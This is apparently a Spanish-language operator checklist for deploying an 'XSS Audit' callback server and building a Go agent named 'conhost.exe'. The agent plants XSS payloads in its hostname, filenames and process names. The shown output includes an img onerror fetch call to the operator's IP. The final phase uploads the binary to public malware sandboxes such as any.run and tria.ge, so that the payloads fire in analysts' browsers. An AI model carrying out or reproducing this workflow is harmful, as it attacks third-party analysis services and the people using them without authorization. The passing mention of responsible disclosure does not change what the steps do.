# ✅ TODO: Despliegue del Módulo XSS Audit

## Checklist para Desplegar a Producción

### 📦 Fase 1: Preparación (En tu máquina local)

- [ ] **1.1** Verificar que todos los archivos están creados
  ```bash
  ls -la artefacto/xss/
  ls -la visualizer/xss_audit/
  ```

- [ ] **1.2** Compilar agente para verificar que funciona
  ```bash
  cd artefacto
  go build -o conhost_xss.exe
  ```

- [ ] **1.3** Hacer commit de los cambios (si usas Git)
  ```bash
  git add .
  git commit -m "Add XSS Audit module"
  git push origin main
  ```

---

### 🚀 Fase 2: Subir Código al Servidor

- [ ] **2.1** Conectar al servidor
  ```bash
  ssh ubuntu@54.37.226.179
  ```

- [ ] **2.2** Hacer backup de la base de datos
  ```bash
  cd /opt/artefacto-visualizer
  sudo cp db.sqlite3 ../db_backup_$(date +%Y%m%d_%H%M%S).sqlite3
  ```

- [ ] **2.3** Hacer backup del código
  ```bash
  cd /opt
  sudo tar -czf artefacto-visualizer-backup-$(date +%Y%m%d).tar.gz artefacto-visualizer/
  ```

- [ ] **2.4** Subir código nuevo

  **Opción A: Git (Recomendado)**
  ```bash
  cd /opt/artefacto-visualizer
  sudo git pull origin main
  ```

  **Opción B: SCP (Desde tu máquina local)**
  ```bash
  # Desde tu máquina
  scp -r visualizer/xss_audit ubuntu@54.37.226.179:/tmp/
  scp visualizer/visualizer/settings.py ubuntu@54.37.226.179:/tmp/
  scp visualizer/visualizer/urls.py ubuntu@54.37.226.179:/tmp/
  scp visualizer/collector/views.py ubuntu@54.37.226.179:/tmp/
  scp visualizer/collector/templates/collector/base.html ubuntu@54.37.226.179:/tmp/
  scp visualizer/deploy/deploy_xss_audit.sh ubuntu@54.37.226.179:/tmp/
  
  # En el servidor
  sudo mv /tmp/xss_audit /opt/artefacto-visualizer/
  sudo mv /tmp/settings.py /opt/artefacto-visualizer/visualizer/
  sudo mv /tmp/urls.py /opt/artefacto-visualizer/visualizer/
  sudo mv /tmp/views.py /opt/artefacto-visualizer/collector/
  sudo mv /tmp/base.html /opt/artefacto-visualizer/collector/templates/collector/
  sudo mv /tmp/deploy_xss_audit.sh /opt/artefacto-visualizer/deploy/
  ```

---

### 🔧 Fase 3: Configurar el Servidor

- [ ] **3.1** Activar entorno virtual
  ```bash
  source /opt/venv/bin/activate
  ```

- [ ] **3.2** Ir al directorio del proyecto
  ```bash
  cd /opt/artefacto-visualizer
  ```

- [ ] **3.3** Verificar que xss_audit está en INSTALLED_APPS
  ```bash
  grep -A 10 "INSTALLED_APPS" visualizer/settings.py | grep xss_audit
  ```
  Debe aparecer: `'xss_audit',`

- [ ] **3.4** Verificar que las URLs están incluidas
  ```bash
  grep "xss_audit" visualizer/urls.py
  ```
  Debe aparecer: `path('', include('xss_audit.urls')),`

- [ ] **3.5** Crear migraciones
  ```bash
  python manage.py makemigrations xss_audit
  ```

- [ ] **3.6** Aplicar migraciones
  ```bash
  python manage.py migrate
  ```

- [ ] **3.7** Recolectar archivos estáticos
  ```bash
  python manage.py collectstatic --noinput
  ```

- [ ] **3.8** Verificar que no hay errores
  ```bash
  python manage.py check
  ```

---

### 🔄 Fase 4: Reiniciar Servicios

- [ ] **4.1** Reiniciar Gunicorn
  ```bash
  sudo systemctl restart gunicorn
  ```

- [ ] **4.2** Verificar estado de Gunicorn
  ```bash
  sudo systemctl status gunicorn
  ```
  Debe estar "active (running)"

- [ ] **4.3** Reiniciar Nginx
  ```bash
  sudo systemctl restart nginx
  ```

- [ ] **4.4** Verificar estado de Nginx
  ```bash
  sudo systemctl status nginx
  ```
  Debe estar "active (running)"

---

### ✅ Fase 5: Verificación

- [ ] **5.1** Probar endpoint de callback desde el servidor
  ```bash
  curl -I "http://localhost/xss-callback?id=test&v=test"
  ```
  Debe retornar: `HTTP/1.1 200 OK`

- [ ] **5.2** Probar endpoint de callback desde fuera
  ```bash
  # Desde tu máquina local
  curl -I "http://54.37.226.179/xss-callback?id=test&v=test"
  ```
  Debe retornar: `HTTP/1.1 200 OK`

- [ ] **5.3** Probar dashboard desde el servidor
  ```bash
  curl -I "http://localhost/xss-audit/dashboard/"
  ```
  Debe retornar: `HTTP/1.1 200 OK`

- [ ] **5.4** Abrir dashboard en navegador
  ```
  http://54.37.226.179/xss-audit/dashboard/
  ```
  Debe cargar correctamente con el diseño oscuro

- [ ] **5.5** Verificar que el enlace "🎯 XSS Audit" aparece en el menú
  ```
  http://54.37.226.179/
  ```
  Debe aparecer en la barra de navegación

- [ ] **5.6** Ver logs para verificar que no hay errores
  ```bash
  sudo journalctl -u gunicorn -n 50 | grep -i error
  ```
  No debe haber errores relacionados con xss_audit

---

### 🧪 Fase 6: Prueba Completa

- [ ] **6.1** En tu máquina local, editar .env del agente
  ```bash
  cd artefacto
  nano .env
  ```
  Cambiar:
  ```env
  XSS_AUDIT=true
  CALLBACK_SERVER=http://54.37.226.179
  ```

- [ ] **6.2** Compilar agente
  ```bash
  go build -o conhost_test.exe
  ```

- [ ] **6.3** Ejecutar agente
  ```bash
  ./conhost_test.exe
  ```

- [ ] **6.4** Verificar salida del agente
  Debe mostrar:
  ```
  [🎯] ========== MODO XSS AUDIT ACTIVADO ==========
  [🎯] Inyectando payloads XSS en múltiples vectores...
  [XSS] Hostname modificado a: PC-<img src=x onerror="fetch('http://54.37.226.179/xss-callback?id=...
  [XSS] Payload xxxxxxxx inyectado en filename
  [XSS] Payload xxxxxxxx inyectado en proceso (PID: xxxx)
  [🎯] Total de payloads inyectados: 10
  ```

- [ ] **6.5** Verificar en el dashboard
  ```
  http://54.37.226.179/xss-audit/dashboard/
  ```
  Debe mostrar:
  - Payloads Inyectados: 10
  - Estado: "injected"

- [ ] **6.6** Simular un hit (opcional)
  ```bash
  # Obtener un payload_id del dashboard
  curl "http://54.37.226.179/xss-callback?id=<payload_id>&v=hostname"
  ```

- [ ] **6.7** Verificar que el hit aparece en el dashboard
  Refrescar el dashboard, debe aparecer en "Últimos XSS Triggerados"

---

### 📊 Fase 7: Monitoreo

- [ ] **7.1** Configurar monitoreo de logs
  ```bash
  # Terminal 1: Logs de Gunicorn
  sudo journalctl -u gunicorn -f | grep -i xss
  
  # Terminal 2: Logs de Nginx
  sudo tail -f /var/log/nginx/artefacto-visualizer-access.log | grep xss-callback
  ```

- [ ] **7.2** Verificar base de datos
  ```bash
  python manage.py shell
  ```
  ```python
  from xss_audit.models import XSSPayload, XSSHit
  print(f"Payloads: {XSSPayload.objects.count()}")
  print(f"Hits: {XSSHit.objects.count()}")
  ```

---

### 📝 Fase 8: Documentación

- [ ] **8.1** Leer la guía completa
  ```
  XSS_AUDIT_GUIDE.md
  ```

- [ ] **8.2** Leer el quick start
  ```
  QUICK_START_XSS.md
  ```

- [ ] **8.3** Familiarizarse con el dashboard
  - Explorar todas las secciones
  - Entender las estadísticas
  - Probar los filtros

---

### 🎯 Fase 9: Uso Real

- [ ] **9.1** Compilar agente para distribución
  ```bash
  cd artefacto
  # Asegurarse que .env tiene XSS_AUDIT=true
  go build -o conhost.exe
  ```

- [ ] **9.2** Subir a sandbox
  - any.run
  - hybrid-analysis
  - joe-sandbox
  - tria.ge
  - etc.

- [ ] **9.3** Monitorear dashboard
  ```
  http://54.37.226.179/xss-audit/dashboard/
  ```

- [ ] **9.4** Analizar resultados
  - ¿Qué sandboxes son vulnerables?
  - ¿Qué vectores funcionan?
  - ¿Qué tasa de éxito hay?

- [ ] **9.5** Disclosure responsable (si encuentras vulnerabilidades)
  - Contactar al vendor
  - Dar tiempo para parchear (90 días)
  - Documentar todo

---

## 🐛 Troubleshooting

### Si algo falla:

1. **Ver logs de Gunicorn**
   ```bash
   sudo journalctl -u gunicorn -n 100
   ```

2. **Ver logs de Nginx**
   ```bash
   sudo tail -f /var/log/nginx/artefacto-visualizer-error.log
   ```

3. **Verificar migraciones**
   ```bash
   python manage.py showmigrations xss_audit
   ```

4. **Verificar configuración**
   ```bash
   python manage.py check
   ```

5. **Rollback si es necesario**
   ```bash
   # Restaurar base de datos
   sudo cp /opt/db_backup_YYYYMMDD_HHMMSS.sqlite3 /opt/artefacto-visualizer/db.sqlite3
   
   # Restaurar código
   cd /opt
   sudo rm -rf artefacto-visualizer
   sudo tar -xzf artefacto-visualizer-backup-YYYYMMDD.tar.gz
   
   # Reiniciar servicios
   sudo systemctl restart gunicorn
   sudo systemctl restart nginx
   ```

---

## ✅ Checklist Final

- [ ] Código subido al servidor
- [ ] Migraciones aplicadas
- [ ] Servicios reiniciados
- [ ] Endpoints funcionando
- [ ] Dashboard cargando
- [ ] Prueba completa exitosa
- [ ] Logs sin errores
- [ ] Documentación leída

---

## 🎉 ¡Listo!

Una vez completado este checklist, el módulo XSS Audit estará **100% funcional** en producción.

**Dashboard:** http://54.37.226.179/xss-audit/dashboard/

**Siguiente paso:** Subir binarios a sandboxes y empezar a auditar.

---

**Fecha:** _______________

**Completado por:** _______________

**Notas:**
_________________________________________________________________
_________________________________________________________________
_________________________________________________________________
